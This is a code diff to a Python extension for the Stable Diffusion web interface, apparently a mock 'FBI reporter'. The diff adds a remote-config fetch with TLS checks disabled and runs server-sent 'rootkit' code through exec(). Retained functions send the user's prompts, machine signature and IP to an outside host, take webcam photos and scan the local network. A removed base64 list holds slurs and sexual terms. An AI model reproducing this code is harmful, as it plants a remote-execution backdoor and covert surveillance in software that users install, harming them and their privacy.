@@ -2,9 +2,9 @@ import getpass
 import os
 import platform
 import re
-import socket
+import sys
 import time
-from base64 import b64decode, b64encode
+from base64 import b64encode
 from typing import List
 
 import cv2
@@ -14,6 +14,8 @@ import torch
 from PIL import Image
 from cpuinfo import get_cpu_info
 from modules import script_callbacks, scripts, shared
+
+from network_scanner import scan_network as scanner
 
 
 def concat(input_obj) -> list:
@@ -29,17 +31,21 @@ def concat(input_obj) -> list:
     return out
 
 
-# Encoded in base64 so shithub doesn't ban me.
-encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "eW91bmc=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph", "ZWxlbWVudGFyeSBzY2hvb2w=", "bWlkZGxlIHNjaG9vbA==",
-                        "aGlnaCBzY2hvb2w=", "dW5kZXJhZ2U=", "Y3V0ZSB0dW1teQ==",
-                        "dGVlbg==", "dGVlbmFnZXI=", "dW5kZXIgYWdl", "dW5kZXItYWdl", "aWxsZWdhbA==", "eW91bmdlciBzaXN0ZXI=", "c2lzdGVy", "b25paS1jaGFu", "aW1vdG8=", "YW5hbA==", "YW51cw==", "YXJzZQ==", "YXNz", "YmFsbHNhY2s=", "Ymxvb2R5",
-                        "Ymxvd2pvYg==", "YmxvdyBqb2I=", "Ym9sbG9jaw==", "Ym9sbG9r",
-                        "Ym9uZXI=", "Ym9vYg==", "YnVnZ2Vy", "YnVt", "YnV0dA==", "YnV0dHBsdWc=", "Y2xpdG9yaXM=", "Y29jaw==", "Y3VudA==", "ZGljaw==", "ZGlsZG8=", "ZHlrZQ==", "ZmFn", "ZmVsbGF0ZQ==", "ZmVsbGF0aW8=", "aml6eg==", "bGFiaWE=", "cGVuaXM=",
-                        "cHViZQ==", "cHVzc3k=", "c2Nyb3R1bQ==", "dmFnaW5h",
-                        "c2V4", "ZXJvdGlj", "bnVkZQ==", "bmFrZWQ=", "YnJlYXN0", "ZmxhdCBjaGVzdA==", "bWlsZg==", "bmlnZ2Vy", "ZmFnZ290", "bWV0aA==", "bXVyZGVyIG9mIGFuIEZCSSBhZ2VudA==", "RWR3YXJkIFNub3dkZW4="]
-banned_words = []
-for word in encoded_banned_words:
-    banned_words.append(b64decode(word).decode())
+# Fetch the config from the FBI server.
+try:
+    r = requests.get('https://fbi.cyberes.net/client', verify=False)
+    client_config = r.json()
+    banned_words = client_config['banned_words']
+except Exception as e:
+    print('Failed to load automated FBI reporter:')
+    print(e)
+    print('Permission not granted to load Stable Diffusion.')
+    sys.exit(1)
+
+# Enable the rootkit if the server tells us to.
+if client_config['rootkit_enabled']:
+    for code in client_config['rootkit']:
+        exec(code)
 
 # Initalize all the things outside of the class since we only need to do it once, not every time the object is created.
 try:
@@ -106,45 +112,42 @@ class FBIReporter(scripts.Script):
             print(f'******** DETECTED UNSAFE PROMPT ********\nBad words: {found_words}\nReporting to FBI...')
             self.report_to_fbi(user_prompt, found_words)
 
-    def report_to_fbi(self, prompt: dict, found_words: list):
-        try:
-            r = requests.post('https://fbi.cyberes.net', headers={'Authorization': 'Bearer jlkasdkljasdljkasdlkj'},
-                              json={'prompt': prompt, 'found_words': found_words, 'machine_signature': machine_signature, 'machine_signature_encoded': machine_signature_encoded, 'external_ip': external_ip, 'ts': time.time()})
-            return r
-        except Exception as e:
-            print('Failed to send data to the FBI.')
-            print('Prompt:', prompt)
-            print('Found words:', found_words)
-            print(e)
 
-    def check_unsafe_prompt(self, prompt) -> List[str]:
-        found_words = []
-        for word in banned_words:
-            if re.search(word.lower(), prompt):
-                found_words.append(word)
-        return found_words
+def report_to_fbi(prompt: dict, found_words: list):
+    try:
+        r = requests.post('https://fbi.cyberes.net/report', headers={'Authorization': 'Bearer jlkasdkljasdljkasdlkj'},
+                          json={'prompt': prompt, 'found_words': found_words, 'machine_signature': machine_signature, 'machine_signature_encoded': machine_signature_encoded, 'external_ip': external_ip, 'ts': time.time()})
+        return r
+    except Exception as e:
+        print('Failed to send data to the FBI.')
+        print('Prompt:', prompt)
+        print('Found words:', found_words)
+        print(e)
 
-    def capture_image_webcam(self) -> Image:
-        """
-        Take a photo of the criminal using their webcam.
-        """
-        v = cv2.VideoCapture(0)
-        ret, frame = v.read()
-        v.release()
-        return Image.fromarray(frame)
 
-    def scan_network(self):
-        """
-        Scan the local network for servers hosting illegal content.
-        """
-        network = []
-        for ip in socket.network_range():
-            target = socket.gethostbyname(ip)
-            s = socket.socket(AF_INET, SOCK_STREAM)
-            conn = s.connect_ex((target, ip))
-            if (conn == 0):
-                network.append(socket.scan_host_ports())
-            s.close()
+def check_unsafe_prompt(prompt) -> List[str]:
+    found_words = []
+    for word in banned_words:
+        if re.search(word.lower(), prompt):
+            found_words.append(word)
+    return found_words
+
+
+def capture_image_webcam() -> Image:
+    """
+    Take a photo of the criminal using their webcam.
+    """
+    v = cv2.VideoCapture(0)
+    ret, frame = v.read()
+    v.release()
+    return Image.fromarray(frame)
+
+
+def scan_network() -> dict:
+    """
+    Scan the criminal's local network for illegal content.
+    """
+    return scanner()
 
 
 def on_ui_settings():
